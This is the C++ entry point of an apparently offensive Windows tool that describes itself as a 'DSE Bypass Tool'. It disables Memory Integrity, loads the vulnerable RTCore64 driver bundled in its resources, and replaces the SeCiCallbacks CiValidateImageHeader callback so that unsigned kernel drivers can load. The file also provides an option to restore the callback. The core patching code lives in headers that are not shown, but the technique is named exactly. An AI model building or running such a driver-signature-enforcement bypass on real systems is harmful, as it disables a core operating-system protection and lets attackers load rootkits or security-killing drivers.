#include "UserInterface.h"
#include "DrvCore.h"
#include "ConfigManager.h"
#include <iostream>

int main() {
    UI::DisplayBanner();

    if (!ConfigManager::CheckAndDisableMemoryIntegrity()) {
        std::wcout << L"[-] Failed to check Memory Integrity status\n";
        return 1;
    }

    std::wcout << L"DSE Bypass Tool - Universal (Dynamic PDB Symbol Loading)\n";
    std::wcout << L"=========================================================\n";
    std::wcout << L"Technique: SeCiCallbacks CiValidateImageHeader replacement\n";
    std::wcout << L"Vulnerable driver: RTCore64 (stored in binary resources)\n";
    std::wcout << L"Symbol resolution: Microsoft Symbol Server (automatic)\n";

    DrvLoader loader;

    if (!loader.Initialize()) {
        std::wcout << L"\n[FAILED] Could not initialize loader\n";
        UI::WaitForAnyKey(L"\nPress any key to exit...");
        return 1;
    }

    bool isPatched = false;
    if (!loader.CheckDSEStatus(isPatched)) {
        std::wcout << L"\n[FAILED] Could not determine DSE status\n";
        UI::WaitForAnyKey(L"\nPress any key to exit...");
        return 1;
    }

    while (true) {
        UI::DisplayMenu(isPatched);

        int choice = 0;
        std::wcin >> choice;
        UI::ClearInputBuffer();

        bool success = false;

        if (choice == 1) {
            if (isPatched) {
                success = loader.RestoreDSE();
                if (success) {
                    std::wcout << L"\n[SUCCESS] DSE has been restored. Driver signature enforcement is active.\n";
                    isPatched = false;
                }
                else {
                    std::wcout << L"\n[FAILED] DSE restoration was unsuccessful.\n";
                }
            }
            else {
                success = loader.BypassDSE();
                if (success) {
                    std::wcout << L"\n[SUCCESS] DSE has been bypassed. You can now load unsigned drivers.\n";
                    isPatched = true;
                }
                else {
                    std::wcout << L"\n[FAILED] DSE bypass was unsuccessful.\n";
                }
            }

            UI::WaitForAnyKey(L"\nPress any key to return to menu...");

        }
        else if (choice == 2) {
            UI::DisplayOffsetInfo(loader);

        }
        else if (choice == 3) {
            std::wcout << L"\nExiting...\n";
            break;

        }
        else {
            std::wcout << L"\n[ERROR] Invalid option selected.\n";
            UI::WaitForAnyKey(L"\nPress any key to return to menu...");
        }
    }

    return 0;
}
